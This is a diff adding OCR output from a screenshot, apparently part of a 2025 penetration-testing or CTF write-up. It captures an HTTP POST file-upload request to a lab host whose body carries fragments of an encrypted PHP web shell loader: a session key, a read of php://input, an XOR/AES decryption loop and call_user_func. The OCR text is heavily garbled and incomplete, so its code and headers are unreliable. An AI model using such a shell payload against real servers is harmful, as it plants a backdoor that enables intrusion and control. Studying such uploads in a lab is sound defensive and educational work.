@@ -1,0 +1,29 @@
+# OCR: 056d7560a1495af1a0a51af2c051fc83.webp
+# 来源: .\02-WriteUp\2025\056d7560a1495af1a0a51af2c051fc83.webp
+# 引擎: tesseract(chi_sim+eng)
+# 生成: 2026-09-01 22:21
+
+POST /vulnerabilities/uploady HTTP/1.1
+Host: 192.168.56.140
+Content-Length: 1037
+Content-Type:
+Connection: close
+Upgrade-Insecure-Requests
+User-Agent: Mozilla/5.6
+error_repor
+ession_start()3
+$k 5e329febSd92Sb //.. eevee eee eect e ence eens
+$_SESSION[ 'k
+session.
+ile_get_contents(“php:/
+ension_loaded(‘openss1'))
+for($i=0;$i<strlen($post) ;$i++)
+$post[$i] = $post[$i] $key [$i+1815];
+"AES128", $key);
+$post=openssl_decrypt($post,
+class C{public function
+@call_user_func(n
+like Gecko) Chrome.
+ebp, image/apng, *.
+/139.0.0.@ Safari/537.36
+q=0.8, application/signed-exchange; v=b3; q=@.7|
